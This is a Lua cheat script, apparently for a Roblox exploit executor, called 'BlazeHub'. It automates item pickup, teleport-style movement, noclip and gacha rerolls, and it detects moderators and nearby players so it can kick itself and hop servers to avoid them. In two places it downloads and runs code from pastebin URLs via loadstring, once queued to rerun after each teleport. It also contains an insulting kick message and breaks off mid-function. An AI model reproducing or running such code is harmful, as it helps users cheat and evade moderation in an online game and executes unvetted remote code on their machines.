local library = loadstring(game:GetObjects("rbxassetid://7657867786")[1].Source)()
local Wait = library.subs.Wait -- Only returns if the GUI has not been terminated. For 'while Wait() do' loops
if not isfolder("BlazeHub") then
    makefolder("BlazeHub")
end
if not isfolder("BlazeHub/Paths") then
    makefolder("BlazeHub/Paths")
end
if not isfolder("BlazeHub/Configs") then
    makefolder("BlazeHub/Configs")
end
local first = true
local first2 = true
local first3 = true
local count = 0
local count2 = 0
local quickCount = 0
local savePoints = {}
local fileSavePoints = {}
local lineSaves = {}
local sphereTableSaves = {}
local isAutoPickup = true
local toggle = true
local toggle2 = false
local idiotProof = false
local panic = false
local panic2 = false
local autoDropItems = {}
local plrList = {}
local spheres= {}
local placeholder = ""
local list = {
    "Old Ring",
    "Old Amulet",
    "Ring",
    "Amulet",
    "Idol of the Forgotten",
    "Goblet",
    "Opal",
    "Ruby",
    "Sapphire",
    "Emerald",
    "Diamond",
    "Scroll of Ignis",
    "Scroll of Tenebris",
    "Scroll of Trahere",
    "Scroll of Telorum",
    "Scroll of Trickstus",
    "Scroll of Hystericus",
    "Scroll of Celeritas",
    "Scroll of Sagitta Sol",
    "Scroll of Viribus",
    "Scroll of Armis",
    "Scroll of Velo",
    "Scroll of Contrarium",
    "Scroll of Fimbulvetr",
    "Scroll of Manus Dei",
    "Scroll of Sraunus",
    "Ice Essence",
    "Phoenix Down",
    "Mysterious Artifact",
    "???",
    "Howler Friend",
    "Amulet of the White King",
    "Lannis's Amulet",
    "Scroom Key",
    "Rift Gem",
    "Night Stone"
}
input = game:GetService("UserInputService")
tweenService = game:GetService("TweenService")
vim = game:GetService("VirtualInputManager")
getgenv().reexec = true
local serverhopTable = {}

function calculateTime(s, d)
    local time = d/s
    return time
end

function antiFrost()
    spawn(function()
        while game.PlaceId == 5208655184 do
            local chr = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
            for i,v in pairs(chr:GetChildren()) do
                if v.Name == "Frostbitten" then
                    v:Destroy()
                end
            end
            chr.ChildAdded:Connect(function(child)
                if child.Name == "Frostbitten" then
                    child:Destroy()
                end
            end)
        wait()
        end
    end)
end

function detectTrinkets(trinket)
    local part
    local returned
    if trinket.Name == "Part" and trinket:FindFirstChild("ID") then
        returned = true
    else
        returned = false
    end
    return returned, trinket
end

function autoPickup(connectTrinket)
    spawn(function()
        local player = game.Players.LocalPlayer
        while isAutoPickup do
            local leWorkspace = game.Workspace:GetChildren()
            for i,v in pairs(leWorkspace) do
                local _, trinket = detectTrinkets(v)
                if _ then
                    local part = trinket:WaitForChild("Part")
                    local clickdetector = part:WaitForChild("ClickDetector")
                    local maxDistance = clickdetector.MaxActivationDistance - 0.1
                    while not player.Character:FindFirstChild("Head") do 
                        wait(0.1)
                    end
                    if player:DistanceFromCharacter(part.Position) < maxDistance and player.Character.Head then
                        fireclickdetector(clickdetector)
                    end
                    if connectTrinket then
                        local part = connectTrinket:FindFirstChild("Part")
                        local clickdetector2 = part:FindFirstChild("ClickDetector")
                        if player:DistanceFromCharacter(part.Position) < maxDistance and player.Character.Head then
                            fireclickdetector(clickdetector2)
                        end
                    end         
                end
            end
            wait()
        end
    end)
end

local common_trinket_ids = {
    ["5196776695"] = "Ring",
    ["5196551436"] = "Amulet",
    ["5204003946"] = "Goblet",
    ["5196782997"] = "Old Ring",
    ["5196577540"] = "Old Amulet",
    ["2765613127"] = "Idol of the Forgotten"
}

local rare_trinket_ids = {
    ["5204453430"] = "Scroll",
    ["4103271893"] = "Candy"
}

local function identify_trinket(trinket)
    local trinket_class = trinket.ClassName
    local is_mesh_part, is_union_operation, is_part = trinket.ClassName == "MeshPart", trinket.ClassName == "UnionOperation", trinket.ClassName == "Part"
    
    if (is_mesh_part or is_union_operation) then
        print("identity stuff")
        local asset_id = is_mesh_part and trinket.MeshId:gsub("%%20", ""):match("%d+") or is_union_operation and gethiddenproperty(trinket, "AssetId"):gsub("%%20", ""):match("%d+")
        local identified_trinket = common_trinket_ids[asset_id]

        if identified_trinket then
            return trinket, "common"
        end
    end

    if is_part then
        local particle_emitter = trinket:FindFirstChild("ParticleEmitter")

        if particle_emitter and tostring(particle_emitter.Color):find("0 1 1 1 0 1 1 1 1 0") then
            local mesh = trinket:FindFirstChild("Mesh")

            if mesh and mesh.MeshId:gsub("%%20", ""):match("%d+") == "2877143560" then 
                local part_color = trinket.Color

                if tostring(part_color) == "0.643137, 0.733333, 0.745098" then 
                    return trinket, "common"
                elseif part_color.G > part_color.R and part_color.G > part_color.B then 
                    return trinket, "common"
                elseif part_color.R > part_color.G and part_color.R > part_color.B then 
                    return trinket, "common"
                elseif part_color.B > part_color.G and part_color.B > part_color.R then 
                    return trinket, "common"
                end
            end
        end
    elseif is_mesh_part then 
        local identified_trinket = rare_trinket_ids[trinket.MeshId:gsub("%%20", ""):match("%d+")]

        if identified_trinket then
            return identified_trinket, "rare"
        end
    end

    if is_part then 
        local particle_emitter = trinket:FindFirstChild("ParticleEmitter")

        if particle_emitter and not tostring(particle_emitter.Color):find("0 1 1 1 0 1 1 1 1 0") then 
            return trinket, "artifact"
        else 
            local orb_particle = trinket:FindFirstChild("OrbParticle")

            if orb_particle then 
                local orb_particle_color = tostring(orb_particle.Color)

                if orb_particle_color:find("0 0.105882 0.596078 0.596078 0 1 0.105882 0.596078 0.596078 0 ") then 
                    return trinket, "ice"
                elseif orb_particle_color:find("0 0.596078 0 0.207843 0 1 0.596078 0 0.207843 0 ") then 
                    return trinket, "common"
                end
            end
        end
    elseif is_mesh_part and trinket.MeshId:gsub("%%20", ""):match("%d+") == "2520762076" then 
        return trinket, "artifact"
    elseif is_union_operation then 
        if trinket.BrickColor.Name == "Black" then 
            return trinket, "artifact"
        else
            local asset_id = gethiddenproperty(trinket, "AssetId"):gsub("%%20", ""):match("%d+")

            if asset_id == "3158350180" then 
                return trinket, "artifact"
            elseif asset_id == "2998499856" then 
                return trinket, "artifact"
            end
        end
    end

    local attachment = trinket:FindFirstChild("Attachment")

    if attachment then
        local particle_emitter = attachment:FindFirstChildOfClass("ParticleEmitter")

        if particle_emitter then 
            local particle_emitter_color = tostring(particle_emitter.Color)
            local size = tostring(trinket.Size)

            if size:find("0.69999998807907, 0.69999998807907, 0.69999998807907") and particle_emitter_color:find("0 0.45098 1 0 0 1 0.482353 1 0 0 ") then 
                return trinket, "artifact"
            elseif size:find("0.69999998807907, 0.69999998807907, 0.69999998807907") and particle_emitter_color:find("0 1 0.8 0 0 1 1 0.501961 0 0 ") then 
                return trinket, "pd"
            end
        end
    end
    return trinket, "common"
end


block_random_player = function()
    local block_player 
    local players_list = game.Players:GetPlayers()

    for index = 1, #players_list do
        local target_player = players_list[index]

        if target_player.Name ~= game.Players.LocalPlayer.Name then
            block_player = target_player
            break
        end
    end

    game:GetService("StarterGui"):SetCore("PromptBlockPlayer", block_player)

    local container_frame = game:GetService("CoreGui").RobloxGui:WaitForChild("PromptDialog"):WaitForChild("ContainerFrame")

    local confirm_button = container_frame:WaitForChild("ConfirmButton")
    
    local confirm_button_text = confirm_button:WaitForChild("ConfirmButtonText")
    
    if confirm_button_text.Text == "Block" then  
        wait()
        for i = 1, 30 do
            local confirm_position = confirm_button.AbsolutePosition
            vim:SendMouseButtonEvent(confirm_position.X + 10, confirm_position.Y + 45, 0, true, game, 0)
            wait(0.05)
            vim:SendMouseButtonEvent(confirm_position.X + 10, confirm_position.Y + 45, 0, false, game, 0)
        end
    end
end

function ServerHop(t)
    block_random_player()
    wait(3)
    game.Players.LocalPlayer:Kick(t)
    wait(3)
    game:GetService("TeleportService"):Teleport(3016661674)
end   

function detectIllu()
    if serverhopTable.illuLog then
        local players = game.Players:GetChildren()
        for i,v in pairs(players) do
            local plrChr = v.Character
            if (plrChr and plrChr:FindFirstChild("Observe")) or v.Backpack:FindFirstChild("Observe") then
                ServerHop("illu is gay")
            end
            wait()
        end
    end
end

function detectMod()
    local players = game.Players:GetChildren()
    for i,v in pairs(players) do
        if v:IsInGroup(4556484) then
            ServerHop("Stinky mod")
        end
        local backpack = v:FindFirstChild("Backpack"):GetChildren()
        for i2,v2 in pairs(backpack) do
            if v2.Name == "Vagrant Soul" or v2.Name == "Time Halt" then
                ServerHop("Stinky mod")
            end
        end
        wait()
    end
end

function roll_spell()
    local vector, bool = game.Workspace.CurrentCamera:WorldToScreenPoint(npc.Head.Position)
    if bool then
        if game.Workspace:FindFirstChild("Union13") then
            game.Workspace.Union13:Destroy()
        end
        for i = 1, 30 do
            vim:SendMouseButtonEvent(vector.x, vector.y, 0, true, game, 0)
            wait(0.05)
            vim:SendMouseButtonEvent(vector.x, vector.y, 0, false, game, 0)
        end
        for i,v in pairs(game:GetService('ReplicatedStorage').Requests:GetChildren()) do 
            if (v:IsA('RemoteEvent')) then 
                v.OnClientEvent:Connect(function(self, ...)
                    if (type(self) == 'table' and self.msg and self.speaker) then 
                        dr = v;
                    end;
                end)
            end;
        end;
        repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("DialogueGui")
        if game.Players.LocalPlayer.PlayerGui:WaitForChild("CaptchaDisclaimer", 10) then
            repeat wait() until game.Players.LocalPlayer.PlayerGui.DialogueGui:FindFirstChild("DialogueFrame"):FindFirstChild("Choices"):FindFirstChild("Bye")
            dr:FireServer({exit = true})
            for i = 1, 360 do
                rconsoleprint("\n Cooldown timer started.")
                wait(1)
            end
            rconsoleprint("\n Attempting to reroll.")
            return roll_spell()
        end
        repeat wait() until  game.Players.LocalPlayer.PlayerGui.DialogueGui.DialogueFrame.Visible
        repeat wait() until game.Players.LocalPlayer.PlayerGui.DialogueGui.DialogueFrame.Choices:FindFirstChild("Bye")
        dr:FireServer({choice = "I'll pay."})
        wait(2)
        dr:FireServer({exit = true})
    end
end

function checkNearby(r)
    if serverhopTable.logNearby then
        local localPlayer = game.Players.LocalPlayer
        local players = game.Players:GetChildren()
        for i,v in pairs(players) do
            if v:DistanceFromCharacter(localPlayer.Character.HumanoidRootPart.Position) < r then
                ServerHop("plr nearby")
            end
            wait()
        end
    end
end

function serverHopAutoPickup()
    spawn(function()
        while true do
            local rarity 
            local name 
            local chr = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
            for i,v in pairs(game.Workspace:GetChildren()) do
                local _, trinket = detectTrinkets(v)
                if _ then
                    local part 
                    local click 
                    trinket, rarity = identify_trinket(trinket)
                    print("beyond the threshhold")
                    if trinket:FindFirstChild("Part") then
                        part = trinket:FindFirstChild("Part")
                    end
                    if part then
                        click = part:FindFirstChild("ClickDetector")
                    end
                    print("part 2, electric boogaloo",serverhopTable.commons, rarity, click.MaxActivationDistance, game.Players.LocalPlayer:DistanceFromCharacter(trinket.Position))
                    if serverhopTable.commons and rarity == "common"  and game.Players.LocalPlayer:DistanceFromCharacter(trinket.Position) <= click.MaxActivationDistance then
                        print("tryna pick up")
                        repeat
                            fireclickdetector(click)
                            wait(0.1)
                        until not trinket or not trinket:IsDescendantOf(game.Workspace)
                    end
                    if serverhopTable.scrolls and rarity == "rare" and game.Players.LocalPlayer:DistanceFromCharacter(trinket.Position) <= click.MaxActivationDistance then
                        spawn(function()
                            repeat                    
                                fireclickdetector(click)
                                wait(0.1)
                            until not trinket or not trinket:IsDescendantOf(game.Workspace)
                        end)
                    end
                    if rarity == "pd" and serverhopTable.pds and game.Players.LocalPlayer:DistanceFromCharacter(trinket.Position) <= click.MaxActivationDistance then
                        spawn(function()
                            repeat                
                                fireclickdetector(click)
                                wait(0.1)
                            until not trinket or not trinket:IsDescendantOf(game.Workspace)
                            if serverhopTable.pdLog then
                                game.Players.LocalPlayer:Kick("Phoenix Down Found")
                            end
                        end)
                    end
                    if rarity == "pd" and serverhopTable.pds and game.Players.LocalPlayer:DistanceFromCharacter(trinket.Position) <= click.MaxActivationDistance then
                        spawn(function()
                            repeat                    
                                fireclickdetector(click)
                                wait(0.1)
                            until not trinket or not trinket:IsDescendantOf(game.Workspace)
                            if serverhopTable.iceLog  then
                                game.Players.LocalPlayer:Kick("Phoenix Down Found")
                            end
                        end)
                    end
                    if rarity == "artifact" and game.Players.LocalPlayer:DistanceFromCharacter(trinket.Position) <= click.MaxActivationDistance then
                        spawn(function()
                            repeat  
                                name = trinket.Name                  
                                fireclickdetector(click)
                                wait(0.1)
                            until not trinket or not trinket:IsDescendantOf(game.Workspace)
                            game.Players.LocalPlayer:Kick("Artifact Found: "..name)
                        end)
                    end
                end
            wait()
            end
        end
    end)
end

local PepsisWorld = library:CreateWindow({
    Name = "BlazeHub",
})

local GeneralTab = PepsisWorld:CreateTab({
    Name = "Main"
})

local tab2 = PepsisWorld:CreateTab({
    "Other Stuff"
})

local gacha = tab2:CreateSection({
    Name = "Gacha"
})


local FarmingSection = GeneralTab:CreateSection({
    Name = "Features"
})
local section2 = GeneralTab:CreateSection({
    Name = "Panic Mode"
})
local section3 = GeneralTab:CreateSection({
    Name = "AutoDrop"
})

local section4 = GeneralTab:CreateSection({
    Name = "Path Creation",
    Side = "Right"
})

local section5 = GeneralTab:CreateSection({
    Name = "Safe Server Bot",
    Side = "Right"
})

local serverhopsection = GeneralTab:CreateSection({
    Name = "Serverhop Bot",
    Side = "Right"
})

local section6 = GeneralTab:CreateSection({
    Name = "Settings",
    Side = "Right"
})

local webhook = gacha:AddTextbox({
    Name = "Webhook", 
})

local player_log_switch = gacha:AddToggle({
    Name = "Log If Player Nearby",
    Flag = "Player_Nearby"
})

local player_log_switch = gacha:AddToggle({
    Name = "Notify and Stop on Godspell",
    Flag = "Godspell_Ping"
})

local player_log_radius = gacha:AddSlider({
    Name = "Player Log Radius",
    Value = 0,
    Min = 0,
    Max = 200
})

local whitelist_radius = gacha:AddToggle({
    Name = "Only log if stranger",
    Flag = "Whitelist_Radius"
})

local optimize_game = gacha:AddToggle({
    Name = "Optimize game when tabbed out",
    Flag = "Optimize_Game"
})


local gacha_bot = gacha:AddToggle({
    Name = "Gacha Bot",
    Flag = "Gacha_Bot",
    Callback = function()
        local dr
        local webhook_url
        local l1, l2, l3
        local old1,old2,old3
        local roulette_checker
        local inventory = {}
        for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.StatGui.Container.Health.Lives:GetChildren()) do
            if i == 3 then
                l1 = v
                old1 = v:FindFirstChild("Char").Text
            elseif i == 4 then
                l2 = v
                old2 = v:FindFirstChild("Char").Text
            elseif i == 5 then
                l3 = v
                old3 = v:FindFirstChild("Char").Text
            end
        end
        local npc = game.Workspace.NPCs:FindFirstChild("Xenyari") or game.Workspace.NPCs:FindFirstChild("Sayana")
        print(webhook:Get())
        if webhook:Get() then
            webhook_url = webhook:Get()
        else
            webhook_url = not webhook_url
        end
        if library.Flags["Gacha_Bot"] then
            
            if game.Players.LocalPlayer:DistanceFromCharacter(npc.Torso.Position) < 25 then
                roll_spell()
            end
            while library.Flags["Gacha_Bot"] do
                if game.Players.LocalPlayer:DistanceFromCharacter(npc.Torso.Position) >= 25 then
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "BlazeHub",
                        Text = "Too far from NPC!"
                    })
                    if webhook_url then
                        local OSTime = os.time();
                        local Time = os.date('!*t', OSTime);
                        local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
                        local Content = "@everyone"
                        local Embed = {
                            title = 'Error';
                            color = '99999';
                            footer = { text = game.JobId };
                            author = {
                                name = 'ROBLOX';
                                url = 'https://www.roblox.com/';
                            };
                            fields = {
                                {
                                    name = "Gacha bot failed: "..game.Players.LocalPlayer.Name,
                                    value = "Too far from NPC!"
                                }
                            };
                            timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
                        };
                        (syn and syn.request or http_request) {
                            Url = webhook_url;
                            Method = 'POST';
                            Headers = {
                                ['Content-Type'] = 'application/json';
                            };
                            Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } )};
                    end
                    break
                end
                local silv = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.CurrencyGui.Silver.Value.Text, ",", "")
                local silv = tonumber(silv)
                if silv < 250 then
                    if webhook_url then
                        local OSTime = os.time();
                        local Time = os.date('!*t', OSTime);
                        local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
                        local Content = "@everyone"
                        local Embed = {
                            title = 'Error';
                            color = '99999';
                            footer = { text = game.JobId };
                            author = {
                                name = 'ROBLOX';
                                url = 'https://www.roblox.com/';
                            };
                            fields = {
                                {
                                    name = "Gacha bot failed: "..game.Players.LocalPlayer.Name,
                                    value = "Not enough silver!"
                                }
                            };
                            timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
                        };
                        (syn and syn.request or http_request) {
                            Url = webhook_url;
                            Method = 'POST';
                            Headers = {
                                ['Content-Type'] = 'application/json';
                            };
                            Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } )};
                     end
                     game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "BlazeHub",
                        Text = "Not enough silver!"
                        
                    })
                    break
                end
                if l3:FindFirstChild("Char").Text ~= old3 then
                    old3 = l3:FindFirstChild("Char").Text
                    roll_spell()
                end
                if library.Flags["Player_Nearby"] then
                    for i,v in pairs(plrList) do
                        for i2,v2 in pairs(game.Players:GetChildren()) do
                            if game.Players.LocalPlayer:DistanceFromCharacter(v2.Character.HumanoidRootPart.Position) < player_log_radius:Get() and ((v2.Name ~= v and library.Flags["Whitelist_Radius"]) or not library.Flags["Whitelist_Radius"]) then
                                game:Shutdown()     
                            end
                            wait()
                        end
                        wait()
                    end
                end
                local a = settings().Rendering.QualityLevel
                local b = game:GetService'UserInputService'
                local c = game:GetService'VirtualUser'
                local d = game:GetService'RunService'
                local e = UserSettings():GetService'UserGameSettings'
                local f = e.MasterVolume
                if not iswindowactive() and library.Flags["Optimize_Game"] then
                    e.MasterVolume = 0
                    settings().Rendering.QualityLevel = 1
                    d:Set3dRenderingEnabled(false)
                else
                    d:Set3dRenderingEnabled(true)
                    settings().Rendering.QualityLevel = a
                    e.MasterVolume = f
                end
                for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    if (v.Name == "Scroll of Snarvindur" or v.Name == "Scroll of Percutiens" or v.Name == "Scroll of Hoppa") and not inventory[v.Name] then
                        inventory[v.Name] = true
                        if webhook_url then
                            local OSTime = os.time();
                            local Time = os.date('!*t', OSTime);
                            local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
                            local Content = "@everyone"
                            local Embed = {
                                title = 'Blazehub Dubs';
                                color = '99999';
                                footer = { text = game.JobId };
                                author = {
                                    name = 'ROBLOX';
                                    url = 'https://www.roblox.com/';
                                };
                                fields = {
                                    {
                                        name = "Godspell rolled!: "..game.Players.LocalPlayer.Name,
                                        value = v.Name
                                    }
                                };
                                timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
                            };
                            (syn and syn.request or http_request) {
                                Url = webhook_url;
                                Method = 'POST';
                                Headers = {
                                    ['Content-Type'] = 'application/json';
                                };
                                Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } )};
                        end
                    end
                end
                wait(1)
            end
        end



    end
})

local serverhopspeed = serverhopsection:AddSlider({
    Name = "Speed",
    Value = 50,
    Min = 50,
    Max = 150
})

local pickup_commons = serverhopsection:AddToggle({
    Name = "Pickup Common Trinkets",
    Flag = "Pickup_Commons",
})

local pickup_scrolls = serverhopsection:AddToggle({
    Name = "Pickup Scrolls",
    Flag = "Pickup_Scrolls",
})

local pickup_pds = serverhopsection:AddToggle({
    Name = "Pickup Phoenix Downs",
    Flag = "Pickup_PDs",
})

local pickup_ices = serverhopsection:AddToggle({
    Name = "Pickup Ice Essences",
    Flag = "Pickup Ices",
})

local illu_detect = serverhopsection:AddToggle({
    Name = "Log To Illusionists",
    Flag = "Illu_Log",
})

local nearby_player = serverhopsection:AddToggle({
    Name = "Log To Nearby Players",
    Flag = "Player_Log",
})

local player_log_radius = serverhopsection:AddSlider({
    Name = "Player Log Radius",
    Value = 50,
    Min = 50,
    Max = 500
})

local pd_log = serverhopsection:AddToggle({
    Name = "Log on PD Pickup",
    Flag = "PD_Log",
})

local ice_log = serverhopsection:AddToggle({
    Name = "Log on Ice Pickup",
    Flag = "Ice_Log",
})

local run_serverhop = serverhopsection:AddButton({
    Name = "Start Serverhop Bot",
    Callback = function() 
        game:GetService("CoreGui")["     "].main.Visible = false
        syn.queue_on_teleport("loadstring(game:HttpGet('https://pastebin.com/raw/zGaV0sE7'))()")
        print("queued")
        serverhopTable.serverhop = true
        serverhopTable.speed = serverhopspeed:Get()
        serverhopTable.commons = pickup_commons:Get()
        serverhopTable.scrolls = pickup_scrolls:Get()
        serverhopTable.pds = pickup_pds:Get()
        serverhopTable.ices = pickup_ices:Get()
        serverhopTable.illuLog = illu_detect:Get()
        serverhopTable.logNearby = nearby_player:Get()
        serverhopTable.logRadius = player_log_radius:Get()
        serverhopTable.pdLog = pd_log:Get()
        serverhopTable.iceLog = ice_log:Get()
        print(serverhopTable.path)
        writefile("BlazeHub/temp.txt", game:GetService("HttpService"):JSONEncode(serverhopTable))
        local encrypted = readfile("BlazeHub/Paths/"..serverhopTable.path..".txt")
        local placeholder = syn.crypt.decrypt(encrypted, "joy")
        local count = 0
        serverHopAutoPickup()
        detectIllu()
        detectMod()
        antiFrost()
        if game:GetService("Workspace").MonsterSpawns.Triggers then
            game:GetService("Workspace").MonsterSpawns.Triggers:Destroy()
        end
        local newCoords = {}
        local CFrames = {} 
        local stopPoints = {}
        local stopPoints2 = {}
        local lootPoints = {}
        local lootPoints2 = {}
        local noclipPoints = {}
        local noclipPoints2 = {}
        local first = true
        local trinket 
        local rarity
        if string.len(placeholder) == 0 then return end
        local stuff = placeholder
        spawn(function()
        end)
        for word in stuff:gmatch("(.-)".." ") do  
            count = count + 1
            print("COUNT CHECK: ",count)
            if word:sub(1, 1) == "(" then
                print("STOP POINT FOUND: ",count)
                table.insert(stopPoints, count)
                table.insert(newCoords, string.sub(word, 2))
            elseif word:sub(1,1) == ")" then
                print("LOOT POINT FOUND: ",count)
                table.insert(lootPoints, count)
                table.insert(newCoords, string.sub(word, 2))
            elseif word:sub(1,1) == "_" then
                table.insert(noclipPoints, count)
                table.insert(newCoords, string.sub(word, 2))
            else
                table.insert(newCoords, word)
            end
        end
        for i,v in pairs(newCoords) do
        if (i+2)%3 == 0 then
            table.insert(CFrames, CFrame.new(v, newCoords[i+1], newCoords[i+2]))
        end
        end
        for i,v in pairs(stopPoints) do
        if (v + 2) % 3 == 0 then
            table.insert(stopPoints2, v)
        end
        end
        for i,v in pairs(lootPoints) do
        if (v + 2) % 3 == 0 then
            table.insert(lootPoints2, v)
        end
        end
        for i,v in pairs(noclipPoints)do
            if (v + 2) % 3 == 0 then
                table.insert(noclipPoints2, v)
            end
        end
        if not game.Players.LocalPlayer.Character then
            repeat
                local confirm_button = game.Players.LocalPlayer.PlayerGui.StartMenu.Choices.Play
                for i = 1, 30 do
                    local confirm_position = confirm_button.AbsolutePosition
                    vim:SendMouseButtonEvent(confirm_position.X + 10, confirm_position.Y + 45, 0, true, game, 0)
                    wait(0.05)
                    vim:SendMouseButtonEvent(confirm_position.X + 10, confirm_position.Y + 45, 0, false, game, 0)
                end
            until game.Players.LocalPlayer.Character
        end
        loadstring(game:HttpGet(("https://pastebin.com/raw/ERDp2x5W"),true))()
        checkNearby(serverhopTable.logRadius)
        spawn(function()
            while true do
                if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then game.Players.LocalPlayer:Kick("Somehow died") end
                wait()
            end
        end)
        game.Workspace.Gravity = 0
        for i,v in pairs(CFrames) do
            if first then
                local time = calculateTime(serverhopTable.speed, game.Players.LocalPlayer:DistanceFromCharacter(Vector3.new(v.x, v.y, v.z)))
                tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "0"
                wait(time)
                for i2,vd in pairs(stopPoints2) do
                    if i == (vd+2)/3 then
                        game.Players.LocalPlayer.Character.Torso.Anchored = true
                        wait(trinket_wait:Get())
                        game.Players.LocalPlayer.Character.Torso.Anchored = false
                    end
                end 
                for i2, vd in pairs(lootPoints2) do
                    if i == (vd+2)/3 then
                        game.Players.LocalPlayer.Character.Torso.Anchored = true
                        local party = game.Workspace:WaitForChild("Part", 5)
                        local id = party:WaitForChild("ID", 5)
                        for i3,v3 in pairs(game.Workspace:GetChildren()) do
                            local _, t = detectTrinkets(v3)
                            if _ then
                                trinket, rarity = identify_trinket(t)
                            end

                            if (_ and game.Players.LocalPlayer:DistanceFromCharacter(v3.Position) <= 300) and (rarity == "common" and serverhopTable.commons) or (rarity == "rare" and serverhopTable.scrolls) or (rarity == "pd" and serverhopTable.pds) or (rarity == "ice" and serverhopTable.ices) or rarity == "artifact" then
                                local time = calculateTime(serverhopTable.speed, game.Players.LocalPlayer:DistanceFromCharacter(v3.Position)) 
                                game.Players.LocalPlayer.Character.Torso.Anchored = false
                                tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v3.CFrame}):Play()
                                wait(time)
                                game.Workspace.Gravity = 196.2
                                fireclickdetector(v3.Part.ClickDetector)
                                wait(1)
                                game.Workspace.Gravity = 0
                            end
                        end
                        local time = calculateTime(serverhopTable.speed, game.Players.LocalPlayer:DistanceFromCharacter(v.Position))
                        game.Players.LocalPlayer.Character.Torso.Anchored = false 
                        tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                    end
                end
                for i2, vd in pairs(noclipPoints2) do
                    if i == ((vd+2)/3) - 1 then
                        local head, torso, name_part_head, character, humanoid_root_part, humanoid
                        local original_velocity
                        local player = game.Players.LocalPlayer
                        local humanoid_root_part = player.Character.HumanoidRootPart
                        local last_noclip_time = tick()
                        
                        local con = game:GetService("RunService").Stepped:Connect(function()
                                character = player.Character
                        
                                if character then
                                    humanoid, humanoid_root_part = character:FindFirstChildOfClass("Humanoid"), character:FindFirstChild("HumanoidRootPart")
                                    head, torso = character:FindFirstChild("Head"), character:FindFirstChild("Torso")
                        
                                    if humanoid and humanoid_root_part and head and torso then
                                        local fake_humanoid = character:FindFirstChild("FakeHumanoid", true)
                        
                                        if fake_humanoid then
                                                last_noclip_time = tick()
                        
                                                local name_part = fake_humanoid.Parent
                        
                                                if name_part then
                                                    name_part_head = name_part:FindFirstChild("Head")
                        
                                                    if name_part_head then
                                                        torso.CanCollide = false
                                                        head.CanCollide = false
                                                        name_part_head.CanCollide = false
                        
                                                        original_velocity = humanoid_root_part.Velocity
                                                        humanoid_root_part.Velocity = Vector3.new(original_velocity.X, 2, original_velocity.Z)
                        
                                                        humanoid.JumpPower = 0
                                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end)
                        local frame = CFrames[i+1]
                        local time = calculateTime(25, game.Players.LocalPlayer:DistanceFromCharacter(Vector3.new(frame.x, frame.y, frame.z)))
                        print("Time check: "..time)
                        tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = CFrames[i+1]}):Play()
                        wait(time)
                        con:Disconnect()
                        head.CanCollide = true
                        torso.CanCollide = true
                        humanoid_root_part.Velocity = original_velocity
                        if name_part_head then
                            name_part_head.CanCollide = true
                        end
                        character.Humanoid.JumpPower = 50
                    end
                end
            else
                local temp = CFrames[i+1]
                local temp1 = Vector3.new(v.x, v.y, v.z)
                local temp2 = Vector3.new(temp.x, temp.y, temp.z)
                local distance = (temp1 - temp2).magnitude
                local time = calculateTime(serverhopTable.speed, distance)
                tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "0"
                            wait(time)
                for i2, v2 in pairs(stopPoints2) do
                    if i == v2/3 then
                        game.Players.LocalPlayer.Character.Torso.Anchored = true
                        wait(trinket_wait:Get())
                        game.Players.LocalPlayer.Character.Torso.Anchored = false
                    end
                end
                for i2, vd in pairs(lootPoints2) do
                    if i == (vd+2)/3 then
                        game.Players.LocalPlayer.Character.Torso.Anchored = true
                        local party = game.Workspace:WaitForChild("Part", 5)
                        local id = party:WaitForChild("ID", 5)
                        for i3,v3 in pairs(game.Workspace:GetChildren()) do
                            local _, t = detecttrinkets(v3)
                            if _ then
                                trinket, rarity = identify_trinket(t)
                            end

                            if (_ and game.Players.LocalPlayer:DistanceFromCharacter(v3.Position) <= 300) and (rarity == "common" and serverhopTable.commons) or (rarity == "rare" and serverhopTable.scrolls) or (rarity == "pd" and serverhopTable.pds) or (rarity == "ice" and serverhopTable.ices) or rarity == "artifact" then
                                local time = calculateTime(serverhopTable.speed, game.Players.LocalPlayer:DistanceFromCharacter(v3.Position)) 
                                game.Players.LocalPlayer.Character.Torso.Anchored = false
                                tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v3.CFrame}):Play()
                                wait(time)
                                game.Workspace.Gravity = 196.2
                                fireclickdetector(v3.Part.ClickDetector)
                                wait(1)
                                game.Workspace.Gravity = 0
                            end
                        end
                        local time = calculateTime(serverhopTable.speed, game.Players.LocalPlayer:DistanceFromCharacter(v.Position))
